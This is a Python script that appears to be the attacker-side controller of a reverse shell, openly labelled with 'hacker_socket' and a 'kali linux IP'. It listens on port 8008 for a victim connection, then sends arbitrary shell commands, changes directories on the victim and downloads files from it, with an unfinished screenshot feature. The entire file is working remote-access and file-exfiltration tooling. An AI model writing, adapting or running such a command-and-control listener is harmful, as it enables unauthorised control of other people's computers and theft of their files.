import socket

IDENTIFIER = "<END_OF_COMMAND_RESULT>"
eof_identifier = "<END_OF_FILE_IDENTIFIER>"
CHUNK_SIZE = 2048

def receive_file():
    print("Receiving file ...")


if __name__ == "__main__":
    hacker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    hacker_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    hacker_IP = "192.168.0.154" # kali linux IP
    hacker_port = 8008
    socket_address = (hacker_IP, hacker_port)
    hacker_socket.bind(socket_address)
    hacker_socket.listen(5)
    print("Listening for incoming connection requests ...")
    hacker_socket, client_address = hacker_socket.accept()
    print("Connection established with ", client_address)
    try:
        while True:
            command = input("Enter the command: ")
            hacker_socket.send(command.encode())
            if (command == "stop") or (command == "quit"):

                hacker_socket.close()
                break

            elif command == "":
                continue

            elif command.startswith("cd"):
                hacker_socket.send(command.encode())
                continue
            elif command.startswith("download"):
                hacker_socket.send(command.encode())
                exist = hacker_socket.recv(1024)
                if exist.decode() == "yes":
                    print("file exists")
                    # receive file here
                    file_name = command.strip("download ")

                    with open(file_name, "wb") as file:
                        print("Downloading file ...")
                        while True:
                            chunk = hacker_socket.recv(CHUNK_SIZE)

                            if chunk.endswith(eof_identifier.encode()):
                                chunk = chunk[:-len(eof_identifier)]
                                file.write(chunk)
                                break
                            file.write(chunk)
                    print("File ", file_name, " successfully downloaded.")

                else:
                    print("File doesn't exist")
                    continue
            elif command == "screenshot":
                print("Taking screenshot ...")
            else:
                full_command_result = b''
                while True:

                    chunk = hacker_socket.recv(1048)
                    if chunk.endswith(IDENTIFIER.encode()):
                        chunk = chunk[:-len(IDENTIFIER)]
                        full_command_result += chunk
                        break

                    full_command_result +=chunk
                print(full_command_result.decode())
    except Exception:
        print("Exception occured.")
        hacker_socket.close()